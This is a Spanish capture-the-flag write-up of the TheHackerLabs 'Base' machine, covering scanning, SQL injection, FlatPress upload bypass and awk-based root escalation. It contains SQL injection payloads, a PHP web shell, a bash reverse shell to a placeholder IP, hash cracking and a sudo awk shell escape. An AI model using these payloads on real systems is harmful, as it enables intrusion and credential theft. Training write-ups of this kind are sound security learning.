---
title: "Base - TheHackerLabs"
date: 2025-09-01
draft: false
slug: "THL-writeup-base"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, empezamos por analizar la página web activa en el puerto 80, resultando ser una página hecha con el CMS FlatPress. Al no encontrar nada útil, pasamos a la página web activa en el puerto 8080, que resulta ser vulnerable a Inyecciones SQL Basadas en Uniones. Logramos dumpear la base de datos del CMS FlatPress, obteniendo credenciales válidas con las que ganamos acceso a su login. Ya logueados, encontramos que la versión usada del FlatPress, siendo la 1.2.1, es vulnerable a File Upload Bypass, con lo que logramos cargar una WebShell de PHP que nos sirve para enviarnos una Reverse Shell, obteniendo el acceso principal a la máquina víctima. Dentro de la máquina, encontramos un hash guardado en un archivo de texto, que copiamos en nuestra máquina y logramos crackearlo con JohnTheRipper, resultando en la contraseña de un usuario de la máquina, que usamos para ganar acceso vía SSH. Como este usuario, descubrimos que está dentro del grupo ADM, lo que nos permite leer los logs de la máquina, siendo en un log de Apache2 donde encontramos la contraseña de otro usuario de la máquina. Como este nuevo usuario, descubrimos que tiene permisos sudoers sobre el binario awk. Utilizando la guía de GTFOBins, encontramos una forma de escalar privilegios con este binario, convirtiéndonos así en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "CMS FlatPress", "SQL Injection", "SQL Injection Union-Based", "SQLi Automatization (SQLMAP)", "File Upload Bypass + RCE (FlatPres Ver 1.2.1)", "Cracking Hash", "Cracking Bcrypt Hash", "Abusing ADM Group", "Abusing Sudoers Privileges", "Abusing Sudoers Privileges On awk Binary", "Privesc - Abusing Sudoers Privilege On awk Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "sqlmap"
  - "php"
  - "nc"
  - "bash"
  - "cat"
  - "grep"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "id"
  - "find"
  - "python3"
  - "wget"
  - "gunzip"
  - "awk"
links:
  - "https://github.com/flatpressblog/flatpress/issues/152"
  - "https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a"
  - "https://gtfobins.github.io/gtfobins/awk/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-base/base.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.70
PING 192.168.100.70 (192.168.100.70) 56(84) bytes of data.
64 bytes from 192.168.100.70: icmp_seq=1 ttl=64 time=1.99 ms
64 bytes from 192.168.100.70: icmp_seq=2 ttl=64 time=1.72 ms
64 bytes from 192.168.100.70: icmp_seq=3 ttl=64 time=2.49 ms
64 bytes from 192.168.100.70: icmp_seq=4 ttl=64 time=1.67 ms

--- 192.168.100.70 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3036ms
rtt min/avg/max/mdev = 1.665/1.966/2.487/0.324 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.70 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 10:38 CST
Happy 28th Birthday to Nmap, may it live to be 128!
Initiating ARP Ping Scan at 10:38
Scanning 192.168.100.70 [1 port]
Completed ARP Ping Scan at 10:38, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:38
Scanning 192.168.100.70 [65535 ports]
Discovered open port 22/tcp on 192.168.100.70
Discovered open port 8080/tcp on 192.168.100.70
Discovered open port 80/tcp on 192.168.100.70
Completed SYN Stealth Scan at 10:39, 15.50s elapsed (65535 total ports)
Nmap scan report for 192.168.100.70
Host is up, received arp-response (0.00068s latency).
Scanned at 2025-09-01 10:38:58 CST for 16s
Not shown: 65420 closed tcp ports (reset), 112 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds
           Raw packets sent: 71888 (3.163MB) | Rcvd: 65424 (2.617MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo 3 puertos abiertos y me da curiosidad el **puerto 8080**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,8080 192.168.100.70 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 10:39 CST
Nmap scan report for 192.168.100.70
Host is up (0.00073s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 c8:5f:17:62:8c:26:0a:7b:b2:c6:07:33:31:64:84:30 (ECDSA)
|_  256 e3:92:58:d8:50:ac:00:5a:49:02:d7:e9:33:18:47:8c (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))

|_http-title: FlatPress
|_http-generator: FlatPress fp-1.2.1
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))

|_http-title: Search Page
|_http-server-header: Apache/2.4.62 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web del **puerto 80**, muestra que se está usando **FlatPress** y la página web del **puerto 8080**, parece que tiene algún contenido que puede redirigir peticiones.

Primero, veamos qué hay en la página web del **puerto 80** y luego la del **puerto 8080**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura1.png">
</p>

Se parece mucho al **CMS WordPress**. Investiguémoslo:

| **FlatPress** |
|:-------------:|
| *FlatPress es un CMS (Content Management System) ligero, escrito en PHP, cuya característica principal es que no utiliza base de datos (como MySQL o PostgreSQL). En lugar de eso, almacena todo el contenido en archivos planos (flat files) dentro del servidor.* |

Pues es bastante similar a **WordPress**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura2.png">
</p>

No hay mucho que destacar.

La página web tiene un login, pero no podremos usarlo a menos que tengamos credenciales válidas.

El código fuente nos dice que se está usando la **versión 1.2.1** de **FlatPress**:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura3.png">
</p>

Guardemos este dato para más adelante.

No encontraremos algo que nos pueda ayudar, así que vayamos a ver la otra página web.

### Analizando Página Web del Puerto 8080 {#Puerto8080}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura4.png">
</p>

Bastante curiosa la página, parece ser de búsqueda de datos.

En este caso, **Wappalizer** no logrará identificar las tecnologías usadas.

Veamos qué nos dice **whatweb**:
```bash
whatweb http://192.168.100.70:8080
http://192.168.100.70:8080 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.70], Title[Search Page]
```
No hay mucho que destacar.

Usando el ejemplo del buscador, si buscamos el nombre **juan**, la página nos dará sus datos:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura5.png">
</p>

Hay varias cosas a destacar:
* Al usar el ejemplo, en la URL aparece el uso de la página **search.php** y el parámetro **query** que parece estar haciendo una **consulta SQL**.
* El resultado de la búsqueda nos lo muestra en una tabla de 5 columnas.

Esto me da a pensar que posiblemente se está utilizando una base de datos de **MySQL** en esta página, y que posiblemente sea vulnerable a **SQLi Union-Based**.

Vamos a comprobarlo de manera manual y luego con la herramienta **SQLMAP**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyección SQL Basada en Uniones {#SQLiUnion}

Para comprobar si es vulnerable a **Inyecciones SQL Basada en Uniones**, primero debemos saber si es vulnerable a **Inyecciones SQL**.

Al ver 5 columnas en la tabla, es de suponer que existen 5 columnas en la tabla actual.

Comprobémoslo con la siguiente inyección:
```bash
' order by 5-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura6.png">
</p>

Si en vez de 5 usas 6, la página dejara de mostrarse, por lo que comprobamos que son 5 columnas.

Ahora, podemos intentar dumpear todos los datos que tiene la tabla actual, suponiendo que están ocultos hasta que se busquen, con la siguiente inyección:
```bash
' or '1'='1'-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura7.png">
</p>

Muy bien, quizá alguno de estos usuarios pertenezca a la máquina víctima o al **CMS FlatPress**.

Probemos a intentar reproducir algo en cada columna con la siguiente **Inyección SQL Basada en Uniones**:
```bash
' union select 1,2,3,4,5-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura8.png">
</p>

Excelente, en cada columna se reproduce un número.

Es posible que podamos obtener información del **servicio MySQL** usando algunas funciones.

Prueba la siguiente inyección:
```bash
' union select database(),version(),user(),@@datadir,current_user()-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura9.png">
</p>

Con esas funciones obtenemos:
* `database()`: El nombre de la base de datos actual.
* `version()`: La versión de MySQL usada.
* `user()`: El usuario con el que se conecta la aplicación.
* `@@datadir`: La ruta del directorio de datos.
* `current_user()`: El usuario actual que está ejecutando la BD.

Ya con este resultado comprobamos que es vulnerable a **Inyecciones SQL Basadas en Uniones**.

Obtengamos las bases de datos existentes con la siguiente inyección:
```bash
' union select schema_name,2,3,4,5 from information_schema.schemata-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura10.png">
</p>

Muy bien, ahí podemos ver la BD del **CMS FlatPress**.

Obtengamos sus tablas con la siguiente inyección:
```bash
' union select table_name,2,3,4,5 from information_schema.tables where table_schem='FlatPress'-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura11.png">
</p>

Vemos la tabla login.

Obtengamos las columnas de esa tabla con la siguiente inyección:
```bash
' union select column_name,2,3,4,5 from information_schema.columns where table_schem='FlatPress' and table_name='login'-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura12.png">
</p>

Solo hay 3 columnas.

Obtengamos los datos de esas columnas con la siguiente inyección:
```bash
' union select id,user,password,NULL,NULL from FlatPress.login-- -
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura13.png">
</p>

Excelente, ya tenemos credenciales válidas para el **CMS FlatPress**.

Entra en el **Login** y mete las credenciales que obtuvimos:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura14.png">
</p>

Estamos dentro.

### Automatizando Inyecciones SQL con SQLMAP {#SQLMAP}

Comprobemos con **SQLMAP** si la página web del **puerto 8080** es vulnerable a **Inyecciones SQL**:
```bash
sqlmap -u 'http://192.168.100.70:8080/' --batch --forms
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: query (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=Ecyj' AND (SELECT 4462 FROM (SELECT(SLEEP(5)))NgVh) AND 'zbXD'='zbXD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: query=Ecyj' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7071,0x4977646d4665774a4249684e4d737851494f436b6b756543614855784e6e6757536c70694773596f,0x71707a7071),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[13:21:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

| Parámetros | Descripción |
|---|---|
| *-u*	     | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |

Sí es vulnerable.

Obtengamos las bases de datos existentes:
```bash
sqlmap -u 'http://192.168.100.70:8080/' --batch --forms --dbs
...
[13:22:10] [INFO] fetching database names
available databases [6]:
[*] FlatPress
[*] information_schema
[*] mysql
[*] Nombres
[*] performance_schema
[*] sys
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |

Bien, tenemos todas las bases de datos.

Obtengamos las tablas de la BD de **FlatPress**:
```bash
sqlmap -u 'http://192.168.100.70:8080/' --batch --forms -D 'FlatPress' --tables
...
[13:22:56] [INFO] fetching tables for database: 'FlatPress'
Database: FlatPress
[1 table]
+-------+

| login |
+-------+
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *-D*	     | Selecciona una base de datos especifica a enumerar. |
| *--tables* | Enumera las tablas de una base de datos específica. |

Como ya conocemos las columnas que tiene esa tabla, simplemente dumpeemos los datos que tiene:
```bash
sqlmap -u 'http://192.168.100.70:8080/' --batch --forms -D 'FlatPress' -T 'login' --dump
...
[13:23:09] [INFO] fetching entries for table 'login' in database 'FlatPress'
Database: FlatPress
Table: login
[1 entry]
+----+--------+-----------------------+

| id | user   | password              |
+----+--------+-----------------------+

| 1  | r0dgar | SNIETbkGBCnhFqeUJuqBO |
+----+--------+-----------------------+
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *-D*       | Selecciona una base de datos específica a enumerar. |
| *-T*       | Selecciona una tabla específica a enumerar. |
| *--dump*   | Extraer datos de una tabla específica. |

Y volvimos a obtener las credenciales de acceso.

Continuemos.

### Aplicando Bypass a Carga de Archivos de FlatPress Ver. 1.2.1 (File Upload Bypass + RCE) {#FlatPressBypass}

Recordando que el **FlatPress** es la **versión 1.2.1**, podemos buscarle un Exploit.

Encontré el siguiente:
* <a href="https://github.com/flatpressblog/flatpress/issues/152" target="_blank">Flatpress 1.2.1 - File upload bypass to RCE Vulnerebility</a>

En este ticket de **GitHub** hacia el repositorio de **FlatPress**, explica cómo es que podemos aplicar un Bypass a la carga de archivos, pues siempre evita que podamos subir **archivos PHP**, lo que nos impide cargar una **WebShell** o **Reverse Shell**.

Vamos a aplicarlo.

Crea la siguiente **WebShell**:
```bash
GIF89a;
<?php
system($_GET['cmd']);
?>
```

Cárgala al **FlatPress** en la sección **Uploader**:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura15.png">
</p>

Dale al botón **Upload** y debería dejarte subir la **WebShell**:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura16.png">
</p>

Funcionó.

Ahí mismo, pasa a la subsección **Media manager** para ver nuestra **WebShell** cargada:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura17.png">
</p>

Selecciona la **WebShell** y escribe el siguiente parámetro en la URL `?cmd=id`:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura18.png">
</p>

Funciona, podemos ejecutar comandos, por lo que podemos mandar una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Ejecuta la siguiente **Reverse Shell** en la URL:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura19.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.70] 38114
bash: cannot set terminal process group (698): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Base:/var/www/html/fp-content/attachs$ whoami
whoami
www-data
```
Estamos dentro.

Solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Como nota adicional, si intentas hacer este mismo proceso para ganar acceso a la máquina víctima con una **Reverse Shell**, no funcionará, aunque no encontré el motivo de esto.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima, Crackeo de Hash Encontrado y Ganando Acceso a Máquina Vía SSH {#linEnum}

Si nos vamos a la ruta `/var/www/sitio2`, encontraremos el archivo vulnerable a **SQLi**:
```bash
www-data@TheHackersLabs-Base:/var/www/sitio2$ ls  
16.jpg	index.php  search.php
www-data@TheHackersLabs-Base:/var/www/sitio2$ cat search.php 
<?php
// Configuración de la base de datos
$servername = "localhost";
$username = "base"; // Usuario de la base de datos
$password = "rodgar"; // Contraseña del usuario de la base de datos
$dbname = "Nombres";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Obtener la consulta del formulario
$query = isset($_GET['query']) ? $_GET['query'] : '';

// Consulta SQL (vulnerable a SQL Injection)
$sql = "SELECT * FROM name WHERE nombre LIKE '%$query%'";
$result = $conn->query($sql);

// Mostrar resultados
?>
...
```
Aquí vemos varias cosas:
* El servidor, usuario, contraseña y base de datos a los que se conecta el script.
* El parámetro que obtiene la consulta del formulario.
* La consulta SQL vulnerable a **SQLi**, pues la consulta no está aplicando ninguna sanitización ni filtro.

Veamos qué usuarios existen en la máquina:
```bash
www-data@TheHackersLabs-Base:/var/www/sitio2$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
pedro:x:1001:1001::/home/pedro:/bin/bash
flate:x:1002:1002::/home/flate:/bin/bash
```
Hay 2 usuarios aparte del **Root**.

Si nos vamos al directorio `/home`, veremos los directorios de dichos usuarios:
```bash
www-data@TheHackersLabs-Base:/var/www/sitio2$ cd /home
www-data@TheHackersLabs-Base:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Sep 12  2024 .
drwxr-xr-x 19 root  root  4096 Sep 10  2024 ..
drwxr-xr-x  3 flate flate 4096 Sep 11  2024 flate
drwxr-xr-x  3 pedro pedro 4096 Sep 10  2024 pedro
```
Tenemos acceso a ambos.

Si entramos en el directorio del **usuario flate**, encontraremos la flag del usuario:
```bash
www-data@TheHackersLabs-Base:/home$ cd flate/
www-data@TheHackersLabs-Base:/home/flate$ ls -la
total 36
drwxr-xr-x 3 flate flate 4096 Sep 11  2024 .
drwxr-xr-x 4 root  root  4096 Sep 12  2024 ..
-rw------- 1 flate flate    0 Sep 11  2024 .bash_history
-rw-r--r-- 1 flate flate  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 flate flate 3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 flate flate 5290 Jul 12  2023 .face
lrwxrwxrwx 1 flate flate    5 Jul 12  2023 .face.icon -> .face
drwxr-xr-x 3 flate flate 4096 Sep 10  2024 .local
-rw-r--r-- 1 flate flate  807 Mar 29  2024 .profile
-rw-r--r-- 1 flate flate   33 Sep 11  2024 user.txt
www-data@TheHackersLabs-Base:/home/flate$ cat user.txt
...
```

Si nos movemos al directorio del **usuario pedro** y listamos sus archivos, no encontraremos algo útil:
```bash
www-data@TheHackersLabs-Base:/home/flate$ cd ../pedro
www-data@TheHackersLabs-Base:/home/pedro$ ls -la
total 20
drwxr-xr-x 3 pedro pedro 4096 Sep 10  2024 .
drwxr-xr-x 4 root  root  4096 Sep 12  2024 ..
lrwxrwxrwx 1 pedro pedro    9 Sep 10  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pedro pedro 5290 Jul 12  2023 .face
lrwxrwxrwx 1 pedro pedro    5 Jul 12  2023 .face.icon -> .face
drwxr-xr-x 3 pedro pedro 4096 Sep 10  2024 .local
```

Encontraremos un archivo interesante en el directorio `/opt`:
```bash
www-data@TheHackersLabs-Base:/home/pedro$ cd /opt
www-data@TheHackersLabs-Base:/opt$ ls -la
total 12
drwxr-xr-x  2 root  root  4096 Sep 10  2024 .
drwxr-xr-x 19 root  root  4096 Sep 10  2024 ..
-rw-r--r--  1 pedro pedro   61 Sep 10  2024 hash.txt
```

Al leerlo, resulta ser un hash:
```bash
www-data@TheHackersLabs-Base:/opt$ cat hash.txt 
$2b$12$Qq75yQ3G.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq
```

Podemos copiarlo en nuestra máquina y tratar de crackearlo con la herramienta **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*****           (?)     
1g 0:00:00:01 DONE (2025-09-01 12:05) 0.6451g/s 34.83p/s 34.83c/s 34.83C/s 123456..basketball
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Parece ser una contraseña, quizá de alguno de los usuarios.

Resultó ser la contraseña del **usuario pedro**, con la que podemos ganar acceso a la máquina vía **SSH**:
```bash
ssh pedro@192.168.100.70
pedro@192.168.100.70's password: 
Linux TheHackersLabs-Base 6.1.0-25-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64
...
pedro@TheHackersLabs-Base:~$ whoami
pedro
```

### Abusando de Grupo Adm para Leer Archivos Restringidos {#Adm}

Veamos qué privilegios tiene nuestro usuario:
```bash
pedro@TheHackersLabs-Base:~$ sudo -l
[sudo] contraseña para pedro: 
Sorry, user pedro may not run sudo on TheHackersLabs-Base.
```
No tienen privilegios.

Veamos a qué grupos pertenece:
```bash
pedro@TheHackersLabs-Base:~$ id
uid=1001(pedro) gid=1001(pedro) grupos=1001(pedro),4(adm)
```
Bien, estamos dentro del **grupo adm**.

| **Grupo Adm** |
|:-------------:|
| *En Linux, el grupo adm es un grupo de administración ligera, diferente de sudo o wheel que permiten ejecutar comandos como root. Su función principal es permitir que los miembros lean archivos de logs del sistema y suele estar presente en distribuciones Debian, Ubuntu y derivadas.* |

Podemos buscar con **find** qué archivos pertenecen al **grupo adm**:
```bash
pedro@TheHackersLabs-Base:~$ find / -group adm 2>/dev/null
/var/log/apt/term.log.1.gz
/var/log/apt/term.log
/var/log/apache2
/var/log/apache2/access.log.1
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.3.gz
/var/log/apache2/access.log
/var/log/apache2/other_vhosts_access.log.2.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/access.log.2.gz
/var/log/apache2/other_vhosts_access.log.1
/var/log/apache2/error.log
/var/log/apache2/error.log.3.gz
/var/log/apache2/error.log.1
/var/log/cups/access_log.2.gz
/var/log/cups/access_log.3.gz
/var/log/cups/access_log.1
/var/log/cups/access_log
```

De acuerdo con el siguiente blog, podemos encontrar usuarios y contraseñas dentro de los logs de los servicios activos de la máquina como **SSH**:
* <a href="https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a" target="_blank">I’m in the ADM Group — Can I Escalate? Yes… Eventually.</a>

En este caso, no vemos algún log de **SSH**, pero sí de **Apache2**.

Quizá en alguno de los archivos **access** de **Apache2** tenga un usuario y contraseña.

Pero, en los archivos `apache2/access.log` y `apache2/access.log.1` no encontraremos algo, por lo que falta verificar los comprimidos.

Levanta un servidor con **Python3** en la máquina víctima:
```bash
pedro@TheHackersLabs-Base:~$ cd /var/log/apache2
pedro@TheHackersLabs-Base:/var/log/apache2$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Con **wget**, descarga ambos archivos en tu máquina:
```bash
wget http://192.168.100.70:8000/access.log.2.gz
wget http://192.168.100.70:8000/access.log.3.gz
```

Descomprime cada uno con la herramienta **gunzip**:
```bash
gunzip access.log.2.gz access.log.3.gz
❯ ls
access.log.2  access.log.3  hash  webshell.php
```

Bien, podemos leer esos archivos y usar **grep** para buscar **username**:
```bash
❯ cat access.log.2 | grep 'username'
203.0.113.56 - flate [12/Sep/2024:12:03:55 +0000] "POST /login HTTP/1.1" 401 4812 "http://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "username=flate&password=******"
                                                                                                                                                                                              
❯ cat access.log.3 | grep 'username'
172.16.241.171 -   [10/Sep/2024:11:47:00 -0600] "GET /login.php?username=flate&password=******** HTTP/1.1" 404 1234 "http://172.16.241.180/somepage.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

En ambos encontramos la contraseña del **usuario flate** y con esto podemos entrar vía **SSH**:
```bash
ssh flate@192.168.100.70
flate@192.168.100.70's password: 
Linux TheHackersLabs-Base 6.1.0-25-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64
...
flate@TheHackersLabs-Base:~$ whoami
flate
```

### Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario AWK {#awk}

Veamos qué privilegios tiene nuestro usuario:
```bash
flate@TheHackersLabs-Base:~$ sudo -l
Matching Defaults entries for flate on TheHackersLabs-Base:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User flate may run the following commands on TheHackersLabs-Base:
    (root) NOPASSWD: /usr/bin/awk
```
Podemos usar el **binario awk** como **Root**.

Encontraremos una forma de escalar privilegios en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/awk/" target="_blank">GTFOBins: awk</a>

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-base/Captura20.png">
</p>

Ejecutémoslo:
```bash
flate@TheHackersLabs-Base:~$ sudo awk 'BEGIN {system("/bin/bash")}'
root@TheHackersLabs-Base:/home/flate# whoami
root
```
Somos **Root**.

Busquemos la última flag:
```bash
root@TheHackersLabs-Base:/home/flate# cd /root
root@TheHackersLabs-Base:~# ls
root.txt
root@TheHackersLabs-Base:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
